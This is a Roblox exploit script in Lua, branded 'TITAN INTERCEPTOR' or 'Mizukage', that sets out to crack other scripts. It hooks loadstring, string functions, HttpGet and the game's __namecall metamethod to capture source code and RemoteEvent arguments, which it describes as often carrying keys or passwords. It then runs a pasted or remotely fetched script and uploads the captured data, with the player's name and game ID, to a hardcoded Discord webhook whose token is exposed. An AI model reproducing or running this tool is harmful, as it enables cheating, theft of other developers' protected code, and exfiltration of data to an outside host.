--[[
    ╔════════════════════════════════════════════════════╗
    ║     ⚔️ TITAN INTERCEPTOR v7.0 [GOD MODE] ⚔️         ║
    ║     UI • ENGINE • NETWORK • SECURITY UPGRADED      ║
    ╚════════════════════════════════════════════════════╝
]]

-- ================= [ SYSTEM CONFIG ] =================
local CONFIG = {
    WEBHOOK_URL = "https://discord.com/api/webhooks/1461254654082945186/Ixc8hGPOMXkeSr2AZK8E3reosEm5vNCHwF1AC_1JnLcuacpIsRVMG43godL8wU75S3Cw", -- <--- GANTI INI
    FILE_PREFIX = "MizukageCracker",
    AUTO_SCROLL = true,
    THEME = {
        Main = Color3.fromRGB(10, 10, 15),
        Accent = Color3.fromRGB(0, 255, 200), -- Cyber Teal
        Text = Color3.fromRGB(240, 240, 240),
        Error = Color3.fromRGB(255, 50, 80)
    }
}
-- =====================================================

-- [ SERVICE PROTECTION ]
local function getService(name)
    return cloneref and cloneref(game:GetService(name)) or game:GetService(name)
end

local CoreGui = getService("CoreGui")
local TweenService = getService("TweenService")
local HttpService = getService("HttpService")
local UserInputService = getService("UserInputService")
local RunService = getService("RunService")
local Players = getService("Players")

-- [ VARIABLES ]
local Logs = {}
local LogCache = {}
local Hooks = {}
local UI_Visible = true

-- [ 1. UI SYSTEM: CYBERNETIC INTERFACE ]
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = HttpService:GenerateGUID(false) -- Random Name for Stealth
ScreenGui.IgnoreGuiInset = true
if gethui then ScreenGui.Parent = gethui()
elseif syn and syn.protect_gui then syn.protect_gui(ScreenGui) ScreenGui.Parent = CoreGui
else ScreenGui.Parent = CoreGui end

-- Main Container
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 450, 0, 300)
MainFrame.Position = UDim2.new(0.5, -225, 0.5, -150)
MainFrame.BackgroundColor3 = CONFIG.THEME.Main
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local MainStroke = Instance.new("UIStroke")
MainStroke.Color = CONFIG.THEME.Accent
MainStroke.Thickness = 1.5
MainStroke.Transparency = 0.6
MainStroke.Parent = MainFrame

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 8)
MainCorner.Parent = MainFrame

-- Top Bar
local TopBar = Instance.new("Frame")
TopBar.Size = UDim2.new(1, 0, 0, 30)
TopBar.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
TopBar.BorderSizePixel = 0
TopBar.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Text = "  ⚔️ Mizukage v1.0"
Title.Size = UDim2.new(0.5, 0, 1, 0)
Title.BackgroundTransparency = 1
Title.TextColor3 = CONFIG.THEME.Accent
Title.Font = Enum.Font.GothamBlack
Title.TextSize = 14
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = TopBar

-- Close Button
local CloseBtn = Instance.new("TextButton")
CloseBtn.Text = "×"
CloseBtn.Size = UDim2.new(0, 30, 0, 30)
CloseBtn.Position = UDim2.new(1, -30, 0, 0)
CloseBtn.BackgroundTransparency = 1
CloseBtn.TextColor3 = CONFIG.THEME.Error
CloseBtn.TextSize = 20
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.Parent = TopBar
CloseBtn.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)

-- Minimize Button
local MiniBtn = Instance.new("TextButton")
MiniBtn.Text = "-"
MiniBtn.Size = UDim2.new(0, 30, 0, 30)
MiniBtn.Position = UDim2.new(1, -60, 0, 0)
MiniBtn.BackgroundTransparency = 1
MiniBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
MiniBtn.TextSize = 20
MiniBtn.Font = Enum.Font.GothamBold
MiniBtn.Parent = TopBar

-- Toggle Mini
local IsMini = false
MiniBtn.MouseButton1Click:Connect(function()
    IsMini = not IsMini
    if IsMini then
        MainFrame:TweenSize(UDim2.new(0, 450, 0, 30), "Out", "Quad", 0.3, true)
    else
        MainFrame:TweenSize(UDim2.new(0, 450, 0, 300), "Out", "Back", 0.4, true)
    end
end)

-- Content Area
local Content = Instance.new("Frame")
Content.Size = UDim2.new(1, 0, 1, -30)
Content.Position = UDim2.new(0, 0, 0, 30)
Content.BackgroundTransparency = 1
Content.Parent = MainFrame

-- Input Box
local InputBox = Instance.new("TextBox")
InputBox.Size = UDim2.new(0.95, 0, 0.2, 0)
InputBox.Position = UDim2.new(0.025, 0, 0.05, 0)
InputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
InputBox.TextColor3 = Color3.fromRGB(200, 200, 200)
InputBox.PlaceholderText = "Paste Script / Loadstring Here..."
InputBox.Text = ""
InputBox.Font = Enum.Font.Code
InputBox.TextSize = 12
InputBox.TextXAlignment = Enum.TextXAlignment.Left
InputBox.TextYAlignment = Enum.TextYAlignment.Top
InputBox.ClearTextOnFocus = false
InputBox.TextWrapped = true
InputBox.Parent = Content
Instance.new("UICorner", InputBox).CornerRadius = UDim.new(0, 6)

-- Console Window (New Feature)
local ConsoleBg = Instance.new("Frame")
ConsoleBg.Size = UDim2.new(0.95, 0, 0.45, 0)
ConsoleBg.Position = UDim2.new(0.025, 0, 0.3, 0)
ConsoleBg.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
ConsoleBg.Parent = Content
Instance.new("UICorner", ConsoleBg).CornerRadius = UDim.new(0, 6)
Instance.new("UIStroke", ConsoleBg).Color = Color3.fromRGB(40, 40, 50)

local ConsoleScroller = Instance.new("ScrollingFrame")
ConsoleScroller.Size = UDim2.new(1, -10, 1, -10)
ConsoleScroller.Position = UDim2.new(0, 5, 0, 5)
ConsoleScroller.BackgroundTransparency = 1
ConsoleScroller.ScrollBarThickness = 4
ConsoleScroller.CanvasSize = UDim2.new(0, 0, 0, 0)
ConsoleScroller.Parent = ConsoleBg

local ConsoleList = Instance.new("UIListLayout")
ConsoleList.Parent = ConsoleScroller
ConsoleList.SortOrder = Enum.SortOrder.LayoutOrder

-- Execute Button
local ExecuteBtn = Instance.new("TextButton")
ExecuteBtn.Text = "CRACK NOW"
ExecuteBtn.Size = UDim2.new(0.95, 0, 0.15, 0)
ExecuteBtn.Position = UDim2.new(0.025, 0, 0.8, 0)
ExecuteBtn.BackgroundColor3 = CONFIG.THEME.Accent
ExecuteBtn.TextColor3 = Color3.fromRGB(10, 10, 10)
ExecuteBtn.Font = Enum.Font.GothamBlack
ExecuteBtn.TextSize = 14
ExecuteBtn.Parent = Content
Instance.new("UICorner", ExecuteBtn).CornerRadius = UDim.new(0, 6)

-- Notification System
local function Notify(msg, isError)
    local Label = Instance.new("TextLabel")
    Label.Text = "> " .. msg
    Label.Size = UDim2.new(1, 0, 0, 15)
    Label.BackgroundTransparency = 1
    Label.TextColor3 = isError and CONFIG.THEME.Error or Color3.fromRGB(150, 255, 150)
    Label.Font = Enum.Font.Code
    Label.TextSize = 10
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = ConsoleScroller
    ConsoleScroller.CanvasSize = UDim2.new(0, 0, 0, ConsoleList.AbsoluteContentSize.Y)
    if CONFIG.AUTO_SCROLL then
        ConsoleScroller.CanvasPosition = Vector2.new(0, ConsoleScroller.CanvasSize.Y.Offset)
    end
end

-- [ 2. ENGINE SYSTEM: GOD MODE HOOKS ]

local function AppendLog(category, content)
    if not content or typeof(content) ~= "string" then return end
    if #content < 4 then return end
    if LogCache[content] then return end
    
    LogCache[content] = true
    local clean = content:gsub("[\0-\31]", ""):gsub("\"", "\\\""):gsub("\\", "\\\\")
    table.insert(Logs, string.format('    ["%s"] = "%s";', category, clean))
    
    Notify("Captured [" .. category .. "]: " .. content:sub(1, 25) .. "...")
end

local function StartInterception(targetScript)
    if WEBHOOK_URL:find("YOUR_WEBHOOK") then
        Notify("ERROR: Webhook URL not set!", true)
        return
    end

    table.clear(Logs)
    table.clear(LogCache)
    
    Notify("SYSTEM: Initializing Hooks...")
    
    -- [ A. LOADSTRING HOOK ]
    if getgenv().loadstring then
        Hooks.ls = hookfunction(getgenv().loadstring, function(chunk)
            AppendLog("SOURCE_CODE", chunk)
            return Hooks.ls(chunk)
        end)
    end
    
    -- [ B. BASIC STRING HOOKS ]
    Hooks.char = hookfunction(string.char, function(...)
        local ret = Hooks.char(...)
        if ret then AppendLog("BYTE_ASM", ret) end
        return ret
    end)
    
    Hooks.concat = hookfunction(table.concat, function(t, sep, ...)
        local ret = Hooks.concat(t, sep, ...)
        if ret then AppendLog("STRING_BUILD", ret) end
        return ret
    end)
    
    Hooks.http = hookfunction(game.HttpGet, function(self, url, ...)
        AppendLog("HTTP_GET", url)
        return Hooks.http(self, url, ...)
    end)
    
    -- [ C. ADVANCED METATABLE HOOKING (NAME CALL) ]
    -- Menangkap pemanggilan method game seperti :Kick(), :FireServer()
    local mt = getrawmetatable(game)
    local old_nc = mt.__namecall
    setreadonly(mt, false)
    
    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        local args = {...}
        
        -- Tangkap RemoteEvent (Sering bawa key/password)
        if method == "FireServer" and self:IsA("RemoteEvent") then
            for i, v in ipairs(args) do
                if typeof(v) == "string" then
                    AppendLog("REMOTE_ARG", v)
                end
            end
        end
        
        -- Tangkap Link dari setclipboard
        if method == "HttpGet" then
            AppendLog("HTTP_GET_NC", args[1])
        end
        
        return old_nc(self, ...)
    end)
    
    -- [ D. EXECUTION SANDBOX ]
    Notify("SYSTEM: Executing Payload...")
    
    task.spawn(function()
        local s, e = pcall(function()
            local func
            if targetScript:find("loadstring") or targetScript:find("game:HttpGet") then
                 func = loadstring(targetScript)
            else
                 func = loadstring(game:HttpGet(targetScript))
            end
            if func then func() end
        end)
        if not s then Notify("RUNTIME ERROR: " .. tostring(e), true) end
    end)
    
    -- [ E. COUNTDOWN & CLEANUP ]
    for i = 8, 1, -1 do
        ExecuteBtn.Text = "⏳ INTERCEPTING... " .. i .. "s"
        task.wait(1)
    end
    
    Notify("SYSTEM: Detaching Hooks...")
    
    -- Restore Hooks
    if Hooks.ls then hookfunction(getgenv().loadstring, Hooks.ls) end
    hookfunction(string.char, Hooks.char)
    hookfunction(table.concat, Hooks.concat)
    hookfunction(game.HttpGet, Hooks.http)
    mt.__namecall = old_nc
    setreadonly(mt, true)
    
    -- [ 3. NETWORK SYSTEM: MULTIPART UPLOADER ]
    Notify("NETWORK: Packaging Data...")
    ExecuteBtn.Text = "📤 UPLOADING..."
    
    local Header = string.format([[
--[[
    ⚔️ TITAN INTERCEPTOR v7.0 REPORT
    --------------------------------
    Target Game : %s
    Place ID    : %d
    Executor    : %s
    LocalPlayer : %s
    Time        : %s
]]
local DumpData = {
]], 
    game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
    game.PlaceId,
    (identifyexecutor and identifyexecutor() or "Unknown"),
    Players.LocalPlayer.Name,
    os.date("%c")
)

    local Footer = "\n}"
    local FinalData = Header .. table.concat(Logs, "\n") .. Footer
    
    local boundary = "---------------------------" .. HttpService:GenerateGUID(false)
    local body = "--" .. boundary .. "\r\n" ..
                 "Content-Disposition: form-data; name=\"file\"; filename=\"" .. CONFIG.FILE_PREFIX .. os.time() .. ".lua\"\r\n" ..
                 "Content-Type: text/plain\r\n\r\n" ..
                 FinalData .. "\r\n" ..
                 "--" .. boundary .. "--"
    
    local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
    
    if request then
        request({
            Url = CONFIG.WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "multipart/form-data; boundary=" .. boundary},
            Body = body
        })
        Notify("SUCCESS: Data sent to Discord!")
        ExecuteBtn.Text = "✅ SUCCESS"
    else
        Notify("FATAL: Executor does not support HTTP!", true)
        ExecuteBtn.Text = "❌ FAILED"
    end
    
    task.wait(2)
    ExecuteBtn.Text = "🚀 INITIATE INTERCEPTION"
end

-- [ EVENT LISTENER ]
ExecuteBtn.MouseButton1Click:Connect(function()
    local scriptTxt = InputBox.Text
    if #scriptTxt < 5 then
        Notify("ERROR: Script is too short!", true)
        return
    end
    StartInterception(scriptTxt)
end)

Notify("TITAN v7.0 INITIALIZED.")
Notify("Waiting for target...")
